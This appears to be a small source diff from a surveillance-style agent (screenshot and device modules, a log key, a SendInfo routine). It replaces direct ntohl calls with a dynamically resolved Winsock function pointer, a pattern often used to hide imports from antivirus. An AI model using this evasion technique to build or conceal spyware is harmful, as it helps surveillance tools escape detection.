@@ -15,6 +15,7 @@
 #include "log_files.h"
 #include "agent_device.h"
 #include "agent_screenshot.h"
+#include "api.h"
 #include "main.h"
 
 #undef _GLOBAL_VERSION_FUNCTIONS_ //be sure not to include the global function (multiple declaration error)
@@ -27,6 +28,7 @@ BYTE pLogKey[32];
 
 extern PDEVICE_CONTAINER pDeviceContainer;
 extern PULONG uSynchro;
+extern PDYNAMIC_WINSOCK dynamicWinsock;
 
 BOOL SendInfo(LPWSTR pInfoString)
 {	
@@ -701,7 +703,7 @@ VOID CalculateSHA1(PBYTE pSha1Buffer, PBYTE pBuffer, ULONG uBufflen)
 	SHA1Result(&pSha1Context);
 
 	for(ULONG x=0; x<5; x++)
-		((PULONG)pSha1Buffer)[x] = ntohl(pSha1Context.Message_Digest[x]);
+		((PULONG)pSha1Buffer)[x] = dynamicWinsock->fpntohl(pSha1Context.Message_Digest[x]);
 }
 
 
@@ -773,7 +775,7 @@ BOOL GetUserUniqueHash(PBYTE pUserHash, ULONG uHashSize)
 				if (SHA1Result(&sha)) 
 				{
 					for (int i=0; i<5; i++)
-						sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
+						sha.Message_Digest[i] = dynamicWinsock->fpntohl(sha.Message_Digest[i]);
 					memcpy(pUserHash, sha.Message_Digest, SHA_DIGEST_LENGTH);
 					bRetVal = TRUE;
 				}
